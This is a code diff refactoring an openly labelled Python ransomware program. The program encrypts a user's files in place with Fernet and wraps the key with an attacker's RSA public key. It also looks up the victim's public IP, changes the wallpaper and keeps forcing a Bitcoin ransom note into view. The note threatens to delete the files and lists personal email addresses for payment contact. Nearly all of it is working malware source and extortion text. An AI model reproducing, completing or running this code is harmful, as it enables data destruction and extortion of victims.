@@ -1,16 +1,15 @@
 # Local Imports
 import os
-import webbrowser  # to load browser to go to specific website eg bitcoin
-import ctypes  # so we can interact with windows dlls and change windows background etc
-import requests  # used to make get reqeust to api.ipify.org to get target machine ip addr
-import time  # used to time.sleep interval for ransom note & check desktop to decrypt system/files
-import datetime  # to give time limit on ransom note
-import subprocess  # to create process for notepad and open ransom  note
-import win32gui  # used to get window text to see if ransom note is on top of all others windows
-import threading  # used for ransom note and decryption key on desktop
+import webbrowser
+import requests
+import ctypes
+import time
+import subprocess
+import win32gui
+import threading
 
 # Framework Imports
-from cryptography.fernet import Fernet  # encrypt/decrypt files on target system
+from cryptography.fernet import Fernet
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 from dotenv import load_dotenv
@@ -24,58 +23,145 @@ DESKTOP_PATH = os.getenv('DESKTOP_PATH')
 ENCRYPT_C_DRIVE = os.getenv('ENCRYPT_C_DRIVE') == "True"
 ENCRYPTION_PATH = os.getenv('ENCRYPTION_PATH')
 
+PUBLIC_IP_API = 'https://api.ipify.org'
+
 
 class RansomWare:
 
-    # File extensions to seek out and Encrypt
-    file_exts = [
-        'txt',
-    ]
-
     def __init__(self):
-        # Key that will be used for Fernet object and encrypt/decrypt method
+        """
+        This function will initialize base requirement of the class.
+        :param: self
+        :return:
+        """
+        # Fernet object and encrypt/decrypt method
         self.key = None
         # Encrypt/Decrypter
         self.crypter = None
         # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
         self.public_key = None
 
-        ''' Root directorys to start Encryption/Decryption from
-            CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
-            CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
-            CAUTION: eg, use 'localRoot' and create Some folder directory and files in them folders etc.
+        ''' 
+        Root directory's to start Encryption/Decryption from
+        CAUTION: Do NOT use self.sysRoot on your own PC as you could end up messing up your system etc...
+        CAUTION: Play it safe, create a mini root directory to see how this software works it is no different
+        CAUTION: eg, use 'localRoot' and create Some folder directory and files in them folders etc.
         '''
         # Use sysroot to create absolute path for files, etc. And for encrypting whole system
         self.sysRoot = os.path.expanduser('~')
-        # Use localroot to test encryption software and for absolute path for files and encryption of
-        # "test system"
-        # self.localRoot = f'{DESKTOP_PATH}\\{PROJECT_NAME}\localRoot'  # Debugging/Testing
+        print(self.sysRoot)
+
         self.localRoot = f'{ENCRYPTION_PATH}'
+        self.publicIP = requests.get(PUBLIC_IP_API).text
 
-        # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
-        self.publicIP = requests.get('https://api.ipify.org').text
+    @staticmethod
+    def change_desktop_background():
+        """
+        This function will change the desktop background.
+        """
+        # path = r"C:\Users\Maaz\Documents\Python-Ransomware\bot.jpg"
+        path = f"{DESKTOP_PATH}\\{PROJECT_NAME}" + r'\bot.jpg'
 
-    # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
+        spi_set_desktop_wallpaper = 20
+        # Access windows dlls for functionality eg, changing desktop wallpaper
+        ctypes.windll.user32.SystemParametersInfoW(spi_set_desktop_wallpaper, 0, path, 0)
+
+    @staticmethod
+    def ransom_note():
+        """
+        This function will write the ransom note in the RANSOM_NOTE file.
+        """
+        with open('RANSOM_NOTE.txt', 'w') as f:
+            f.write(f'''
+                ** Your system have been encrypted with a Military grade encryption algorithm. **
+
+                ** There is no way to restore your data without a special key. **
+
+                Only we can decrypt your files!
+
+                To purchase your key and restore your data, please follow these three easy steps:
+
+                1. Email the file called EMAIL_ME.txt at C:\\Users\\Maaz\\Desktop\\EMAIL_ME.txt to 
+                maazsabahuddin@gmail.com
+
+                2. You will receive your personal BTC address for payment.
+                   Once payment has been completed, send another email to altamashkarlekar@gmail.com stating "PAID".
+                   We will check to see if payment has been paid.
+
+                3. You will receive a text file with your KEY that will unlock all your files. 
+                   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin 
+                   to decrypt all files.
+
+                WARNING:
+
+                - Do NOT attempt to decrypt your files with any software because that will not work, and may cost you 
+                more to unlock your files.
+
+                - Do NOT change file names, mess with the files, or run decryption software as it will cost you more 
+                to unlock your files and there is a high chance you will lose your files forever.
+
+                Do NOT send "PAID" button without paying, price WILL go up for disobedience.
+
+                Do NOT think that we won't delete your files altogether and throw away the key if you refuse to pay.
+            ''')
+
+    @staticmethod
+    def show_ransom_note():
+        """
+        This function will take care to pop up the ransom note continously.
+        """
+        # Open the ransom note
+        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
+        count = 0  # Debugging/Testing
+        while True:
+            time.sleep(0.1)
+            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+            if top_window == 'RANSOM_NOTE - Notepad':
+                print('Ransom note is the top window - do nothing')  # Debugging/Testing
+                pass
+            else:
+                print('Ransom note is not the top window - kill/create process again')
+                time.sleep(0.1)
+                ransom.kill()
+                time.sleep(0.1)
+                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
+
+            time.sleep(5)
+            count += 1
+            if count == 5:
+                break
+
     def generate_key(self):
-        # Generates url safe(base64 encoded) key
+        """
+        This function will generate a URL safe(base64 encoded) key and creates a Fernet object with encrypt/decrypt
+        methods. Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims' data.
+        :param: self
+        :return:
+        """
         self.key = Fernet.generate_key()
         print(f"Fernet Key {self.key}")
-        # Creates a Fernet object with encrypt/decrypt methods
+
         self.crypter = Fernet(self.key)
         print(f"Crypter {self.crypter}")
-    
-    # Write the fernet(symmetric key) to text file
+
     def write_key(self):
+        """
+        This function will write the fernet(symmetric key) to text file.
+        """
         try:
             with open('fernet_key.txt', 'wb') as f:
                 f.write(self.key)
         except Exception as e:
             print(f"Error While Writing into fernet_key.txt: {e}")
 
-    # Encrypt [SYMMETRIC KEY] that was created on victim machine to Encrypt/Decrypt files with our PUBLIC ASYMMETRIC-
-    # -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYMMETRIC KEY used for-
-    # -Encrypt/Decrypt of files on target machine with our PRIVATE KEY, so that they can then Decrypt files etc.
     def encrypt_fernet_key(self):
+        """
+        Encrypt [SYMMETRIC KEY] that was created on victim machine to Encrypt/Decrypt files with our PUBLIC ASYMMETRIC-
+        -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYMMETRIC KEY used for-
+        -Encrypt/Decrypt of files on target machine with our PRIVATE KEY, so that they can then Decrypt files etc.
+        :param: self
+        :return:
+        """
         with open('fernet_key.txt', 'rb') as fk:
             fernet_key = fk.read()
         with open('fernet_key.txt', 'wb') as f:
@@ -84,22 +170,28 @@ class RansomWare:
             # Public encrypter object
             public_crypter = PKCS1_OAEP.new(self.public_key)
             # Encrypted fernet key
-            enc_fernent_key = public_crypter.encrypt(fernet_key)
+            enc_fernet_key = public_crypter.encrypt(fernet_key)
             # Write encrypted fernet key to file
-            f.write(enc_fernent_key)
+            f.write(enc_fernet_key)
 
-        # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and
-        # get system/files back
-        with open(f'{DESKTOP_PATH}\{PROJECT_NAME}\EMAIL_ME.txt', 'wb') as fa:
-            fa.write(enc_fernent_key)
+        # Write encrypted fernet key to the respective location.
+        with open(f'{DESKTOP_PATH}\\{PROJECT_NAME}' + r'\EMAIL_ME.txt', 'wb') as fa:
+            fa.write(enc_fernet_key)
+
         # Assign self.key to encrypted fernet key
-        self.key = enc_fernent_key
+        self.key = enc_fernet_key
         # Remove fernet crypter object
         self.crypter = None
 
-    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt file - file_path:str:absolute file path
-    # eg, C:/Folder/Folder/Folder/Filename.txt
     def crypt_file(self, file_path, encrypted=False):
+        """
+        This function will encrypt and decrypt data based on the filepath
+        file_path:str:absolute file path (eg, C:/Folder/Folder/Folder/Filename.txt)
+        :param: self
+        :param: file_path
+        :param: encrypted
+        :return:
+        """
         with open(file_path, 'rb') as f:
             # Read data from file
             data = f.read()
@@ -109,37 +201,22 @@ class RansomWare:
                 # Encrypt data from file
                 _data = self.crypter.encrypt(data)
                 # Log file encrypted and print encrypted contents - [debugging]
-                print('> File encrpyted')
+                print('> File encrypted')
                 print(_data)
             else:
                 # Decrypt data from file
                 _data = self.crypter.decrypt(data)
                 # Log file decrypted and print decrypted contents - [debugging]
-                print('> File decrpyted')
+                print('> File decrypted')
                 print(_data)
         with open(file_path, 'wb') as fp:
             # Write encrypted/decrypted data to file using same filename to overwrite original file
             fp.write(_data)
 
-    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on
-    # victim machine
-    def crypt_system_new(self, encrypted=False):
-        system = os.walk(self.localRoot, topdown=True)
-        for root, dir, files in system:
-            for file in files:
-                file_path = os.path.join(root, file)
-                if not ENCRYPT_C_DRIVE:
-                    if not file.split('.')[-1] in self.file_exts:
-                        continue
-                if not encrypted:
-                    self.crypt_file(file_path)
-                else:
-                    self.crypt_file(file_path, encrypted=True)
-
     def crypt_system(self, encrypted=False):
 
-        excluded_dirs = ['AppData', 'Local', 'Programs\Python']
-        excluded_files = ['desktop.ini']  # Add more as needed
+        excluded_dirs = ['AppData', 'Local', r'Programs\Python']
+        excluded_files = ['desktop.ini']
 
         # Walk through all directories and files in C:\Users
         for root, dirs, files in os.walk(self.localRoot, topdown=True):
@@ -166,7 +243,7 @@ class RansomWare:
         image_height = "300"  # Height in pixels
 
         # Ransom note content
-        ransom_note = """
+        _ransom_note = """
         <div class="ransom-note">
             <h2>Your system has been encrypted with a Military-grade encryption algorithm.</h2>
             <h2>There is no way to restore your data without a special key.</h2>
@@ -176,17 +253,24 @@ class RansomWare:
             <p>To purchase your key and restore your data, please follow these three easy steps:</p>
 
             <ol>
-                <li>Email the file called EMAIL_ME.txt at C:\\Users\\Maaz\\Desktop\\EMAIL_ME.txt to maazsabahuddin@gmail.com</li>
-                <li>You will receive your personal BTC address for payment. Once payment has been completed, send another email to altamashkarlekar@gmail.com stating "PAID". We will check to see if payment has been paid.</li>
-                <li>You will receive a text file with your KEY that will unlock all your files. IMPORTANT: To decrypt your files, place the text file on the desktop and wait. Shortly after it will begin to decrypt all files.</li>
+                <li>Email the file called EMAIL_ME.txt at C:\\<Project>\\EMAIL_ME.txt to maazsabahuddin@gmail.com</li>
+                <li>You will receive your personal BTC address for payment. Once payment has been completed, send 
+                another email to altamashkarlekar@gmail.com stating "PAID". We will check to see if payment has been 
+                paid.</li>
+                <li>You will receive a text file with your KEY that will unlock all your files. IMPORTANT: To decrypt 
+                your files, place the text file on the desktop and wait. Shortly after it will begin to decrypt all 
+                files.</li>
             </ol>
 
             <p>WARNING:</p>
             <ul>
-                <li>Do NOT attempt to decrypt your files with any software because that will not work, and may cost you more to unlock your files.</li>
-                <li>Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock your files and there is a high chance you will lose your files forever.</li>
+                <li>Do NOT attempt to decrypt your files with any software because that will not work, and may cost you 
+                more to unlock your files.</li>
+                <li>Do NOT change file names, mess with the files, or run decryption software as it will cost you more 
+                to unlock your files and there is a high chance you will lose your files forever.</li>
                 <li>Do NOT send "PAID" button without paying, the price WILL go up for disobedience.</li>
-                <li>Do NOT think that we won't delete your files altogether and throw away the key if you refuse to pay.</li>
+                <li>Do NOT think that we won't delete your files altogether and throw away the key if you refuse to 
+                pay.</li>
             </ul>
         </div>
         """
@@ -207,7 +291,7 @@ class RansomWare:
             file.write(f'<img src="{image_url}" alt="Sample Image" width="{image_width}" height="{image_height}">\n')
 
             # Add ransom note content
-            file.write(ransom_note)
+            file.write(_ransom_note)
 
             file.write('</body>\n</html>')
 
@@ -217,74 +301,6 @@ class RansomWare:
         # Open in the default web browser
         webbrowser.open(f'file://{abs_path}')
 
-    def change_desktop_background(self):
-        # path = r"C:\Users\Maaz\Documents\Python-Ransomware\bot.jpg"
-        path = f"{DESKTOP_PATH}\\{PROJECT_NAME}" + r'\bot.jpg'
-
-        SPI_SETDESKWALLPAPER = 20
-        # Access windows dlls for functionality eg, changing desktop wallpaper
-        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
-
-    def ransom_note(self):
-        date = datetime.date.today().strftime('%d-%B-Y')
-        with open('RANSOM_NOTE.txt', 'w') as f:
-            f.write(f'''
-                ** Your system have been encrypted with a Military grade encryption algorithm. **
-                
-                ** There is no way to restore your data without a special key. **
-                
-                Only we can decrypt your files!
-                
-                To purchase your key and restore your data, please follow these three easy steps:
-                
-                1. Email the file called EMAIL_ME.txt at C:\\Users\Maaz\Desktop\EMAIL_ME.txt to maazsabahuddin@gmail.com
-                
-                2. You will receive your personal BTC address for payment.
-                   Once payment has been completed, send another email to altamashkarlekar@gmail.com stating "PAID".
-                   We will check to see if payment has been paid.
-                
-                3. You will receive a text file with your KEY that will unlock all your files. 
-                   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt 
-                   all files.
-                
-                WARNING:
-                
-                - Do NOT attempt to decrypt your files with any software because that will not work, and may cost you more to
-                unlock your files.
-                
-                - Do NOT change file names, mess with the files, or run decryption software as it will cost you more to unlock
-                your files and there is a high chance you will lose your files forever.
-                
-                Do NOT send "PAID" button without paying, price WILL go up for disobedience.
-                
-                Do NOT think that we won't delete your files altogether and throw away the key if you refuse to pay.
-            ''')
-
-    def show_ransom_note(self):
-        # Open the ransom note
-        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
-        count = 0  # Debugging/Testing
-        while True:
-            time.sleep(0.1)
-            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
-            if top_window == 'RANSOM_NOTE - Notepad':
-                print('Ransom note is the top window - do nothing')  # Debugging/Testing
-                pass
-            else:
-                print('Ransom note is not the top window - kill/create process again')  # Debugging/Testing
-                # Kill ransom note, so we can open it again and make sure ransom note is in ForeGround
-                # (top of all windows)
-                time.sleep(0.1)
-                ransom.kill()
-                # Open the ransom note
-                time.sleep(0.1)
-                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
-            # sleep for 5 seconds
-            time.sleep(5)
-            count += 1
-            if count == 5:
-                break
-    
     # Decrypts system when text file with un-encrypted key in it is placed on desktop of target machine
     def put_me_on_desktop(self):
         # Loop to check file and if file it will read key and then self.key + self.cryptor will be valid for decrypting-
@@ -296,12 +312,12 @@ class RansomWare:
                 # The ATTACKER decrypts the fernet symmetric key on their machine and then puts the un-encrypted fernet-
                 # -key in this file and sends it in an email to victim. They then put this on the desktop, and it will
                 # be used to un-encrypt the system. AT NO POINT DO WE GIVE THEM THE PRIVATE ASYMMETRIC KEY etc.
-                with open(f'{self.sysRoot}\Desktop\PUT_ME_ON_DESKTOP.txt', 'r') as f:
+                with open(f'{self.sysRoot}' + r'\Desktop\PUT_ME_ON_DESKTOP.txt', 'r') as f:
                     self.key = f.read()
                     self.crypter = Fernet(self.key)
                     # Decrypt system once have filed is found, and we have cryptor with the correct key
                     self.crypt_system(encrypted=True)
-                    print('decrypted')  # Debugging/Testing
+                    print('decrypted')
                     break
             except Exception as e:
                 print(e)  # Debugging/Testing
@@ -324,12 +340,12 @@ def main():
     t2 = threading.Thread(target=rw.put_me_on_desktop)
 
     t1.start()
-    print('> RansomWare: Attack completed on target machine and system is encrypted')  # Debugging/Testing
+    print('> RansomWare: Attack completed on target machine and system is encrypted')
     print('> RansomWare: Waiting for attacker to give target machine document that '
-          'will un-encrypt machine')  # Debugging/Testing
+          'will un-encrypt machine')
     t2.start()
-    print('> RansomWare: Target machine has been un-encrypted')  # Debugging/Testing
-    print('> RansomWare: Completed')  # Debugging/Testing
+    print('> RansomWare: Target machine has been un-encrypted')
+    print('> RansomWare: Completed')
 
 
 if __name__ == '__main__':
